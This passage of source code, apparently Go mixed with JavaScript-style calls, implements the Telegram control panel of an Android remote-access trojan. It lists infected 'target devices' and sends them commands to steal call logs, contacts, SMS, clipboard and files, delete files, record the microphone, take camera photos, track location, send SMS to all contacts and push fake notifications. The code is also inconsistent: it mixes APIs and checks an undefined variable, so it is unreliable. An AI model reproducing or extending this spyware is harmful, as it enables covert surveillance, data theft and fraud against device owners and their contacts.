    • ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ
    • ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ
    • ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ`)
            reply.ParseMode = "HTML"
            reply.ReplyMarkup = tgbotapi.NewReplyKeyboard(
                tgbotapi.NewKeyboardButtonRow(
                    tgbotapi.NewKeyboardButton("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"),
                    tgbotapi.NewKeyboardButton("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"),
                ),
            )
            bot.Send(reply)
        }

        if message.Text == "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨" {
            var connectedDevices string
            wsClients.Range(func(key, value interface{}) bool {
                client := value.(*WebSocketClient)
                connectedDevices += fmt.Sprintf(`• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>%s</b>
    • ʙᴀᴛᴛᴇʀʏ : <b>%s</b>
    • ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>%s</b>
    • ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>%s</b>
    • ᴘʀᴏᴠɪᴅᴇʀ : <b>%s</b>

    `, client.Info["model"], client.Info["battery"], client.Info["version"], client.Info["brightness"], client.Info["provider"])
                return true
            })

            if connectedDevices == "" {
                bot.Send(tgbotapi.NewMessage(chatID, `°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚

    • ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ`))
            } else {
                bot.Send(tgbotapi.NewMessage(chatID, "°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n"+connectedDevices).WithParseMode("HTML"))
            }
        }

        if message.Text == "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙" {
            deviceListKeyboard := [][]tgbotapi.InlineKeyboardButton{}
            wsClients.Range(func(key, value interface{}) bool {
                client := value.(*WebSocketClient)
                deviceListKeyboard = append(deviceListKeyboard, tgbotapi.NewInlineKeyboardRow(
                    tgbotapi.NewInlineKeyboardButtonData(client.Info["model"], "device:"+key.(string)),
                ))
                return true
            })

            if len(deviceListKeyboard) == 0 {
                bot.Send(tgbotapi.NewMessage(chatID, `°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚

    • ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ`))
            } else {
                msg := tgbotapi.NewMessage(chatID, "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢ᴀ𝙣𝙙")
                msg.ReplyMarkup = tgbotapi.NewInlineKeyboardMarkup(deviceListKeyboard...)
                bot.Send(msg)
            }
        }
    } else {
        bot.Send(tgbotapi.NewMessage(chatID, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙"))
    }
}

appBot.On("callback_query", func(callbackQuery map[string]interface{}) {
    msg := callbackQuery["message"].(map[string]interface{})
    data := callbackQuery["data"].(string)
    commend := strings.Split(data, ":")[0]
    uuid := strings.Split(data, ":")[1]
    fmt.Println(uuid)
    if commend == "device" {
        appBot.EditMessageText(fmt.Sprintf("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>%s</b>", appClients[uuid]["model"].(string)), map[string]interface{}{
            "width":      10000,
            "chat_id":    msg["chat_id"],
            "message_id": msg["message_id"],
            "reply_markup": map[string]interface{}{
                "inline_keyboard": [][]map[string]string{
                    {
                        {"text": "𝘼𝙥𝙥𝙨", "callback_data": fmt.Sprintf("apps:%s", uuid)},
                        {"text": "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", "callback_data": fmt.Sprintf("device_info:%s", uuid)},
                    },
                    {
                        {"text": "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", "callback_data": fmt.Sprintf("file:%s", uuid)},
                        {"text": "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", "callback_data": fmt.Sprintf("delete_file:%s", uuid)},
                    },
                    {
                        {"text": "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", "callback_data": fmt.Sprintf("clipboard:%s", uuid)},
                        {"text": "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", "callback_data": fmt.Sprintf("microphone:%s", uuid)},
                    },
                    {
                        {"text": "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", "callback_data": fmt.Sprintf("camera_main:%s", uuid)},
                        {"text": "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", "callback_data": fmt.Sprintf("camera_selfie:%s", uuid)},
                    },
                    {
                        {"text": "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", "callback_data": fmt.Sprintf("location:%s", uuid)},
                        {"text": "𝙏𝙤𝙖𝙨𝙩", "callback_data": fmt.Sprintf("toast:%s", uuid)},
                    },
                    {
                        {"text": "𝘾𝙖𝙡𝙡𝙨", "callback_data": fmt.Sprintf("calls:%s", uuid)},
                        {"text": "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", "callback_data": fmt.Sprintf("contacts:%s", uuid)},
                    },
                    {
                        {"text": "𝙑𝙞𝙗𝙧𝙖𝙩𝙚", "callback_data": fmt.Sprintf("vibrate:%s", uuid)},
                        {"text": "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", "callback_data": fmt.Sprintf("show_notification:%s", uuid)},
                    },
                    {
                        {"text": "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", "callback_data": fmt.Sprintf("messages:%s", uuid)},
                        {"text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", "callback_data": fmt.Sprintf("send_message:%s", uuid)},
                    },
                    {
                        {"text": "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", "callback_data": fmt.Sprintf("play_audio:%s", uuid)},
                        {"text": "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", "callback_data": fmt.Sprintf("stop_audio:%s", uuid)},
                    },
                    {
                        {"text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨", "callback_data": fmt.Sprintf("send_message_to_all:%s", uuid)},
                    },
                },
            },
            "parse_mode": "HTML",
        })
    }
    if command == "calls" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("calls"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "contacts" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("contacts"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "messages" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("messages"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "apps" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("apps"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "device_info" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("device_info"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "clipboard" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("clipboard"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "camera_main" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("camera_main"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "camera_selfie" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("camera_selfie"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "location" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("location"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙛𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "vibrate" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("vibrate"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙛𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "stop_audio" {
        for _, client := range appSocket.clients {
            if client.UUID == uuid {
                client.Conn.WriteMessage(websocket.TextMessage, []byte("stop_audio"))
            }
        }
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n"+
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
            map[string]interface{}{
                "parse_mode": "HTML",
                "reply_markup": map[string]interface{}{
                    "keyboard":        [][]string{{"𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙛𝙞𝙘𝙚𝙨"}, {"𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"}},
                    "resize_keyboard": true,
                },
            },
        )
    }
    if command == "send_message" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n"+
                "•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍ꜂ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜳ ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ᴄᴏᴅᴇ",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
            },
        )
        currentUuid = uuid
    }
    if command == "send_message_to_all" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n"+
                "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱ꜇ᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪ꜇ ᴛʜᴇ ɴᴜᴍʙᴇʀ",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
            },
        )
        currentUuid = uuid
    }

    if command == "file" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n"+
                "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜙ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ᴇɴᴛᴇʀ <b>DCIM/Camera</b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇ꜃",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }
    if command == "delete_file" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n"+
                "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜙ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ᴇɴᴛᴇʀ <b>DCIM/Camera</b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇ꜃",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }

    if command == "microphone" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n"+
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛ꜕ ᴏꜰ ꜱᴇᴄᴏɴᴅ꜃",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }
    if command == "toast" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n"+
                "• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀ꜇ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅ꜇",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }

    if command == "show_notification" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n"+
                "• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜ꜇ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }

    if command == "play_audio" {
        appBot.DeleteMessage(id, msg.MessageID)
        appBot.SendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n"+
